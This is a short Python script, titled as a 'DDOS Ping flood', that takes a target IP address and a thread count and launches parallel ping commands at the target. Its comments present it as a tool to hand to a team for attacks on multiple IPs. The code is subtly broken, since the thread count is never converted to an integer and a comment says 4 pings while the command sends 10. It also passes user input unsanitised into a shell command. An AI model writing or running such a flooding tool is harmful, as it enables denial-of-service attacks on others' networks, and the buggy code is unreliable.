#Chase Alexander DDOS Ping flood

import os
import threading


threads=input("how many threads?")#determines the number of threads running simultaneously for volume control

#setting the target ip address, modular so it can distributed to the team for widespread use on multiple IPs
target1=input("first octect")
target2=input("second octect")
target3=input("third octet")
target4=input("fourth octet")
target1=str(target1)
target2=str(target2)
target3=str(target3)
target4=str(target4)
#combines the octets into a full address
target=target1+"."+target2+"."+target3+"."+target4

#method to send 4 pings to the target ip address
def attack():
	os.system("ping -c 10 "+target)

#thread control determining the number of sets of pings going to an address
for i in range(threads):
	thread = threading.Thread(target=attack)
	thread.start()
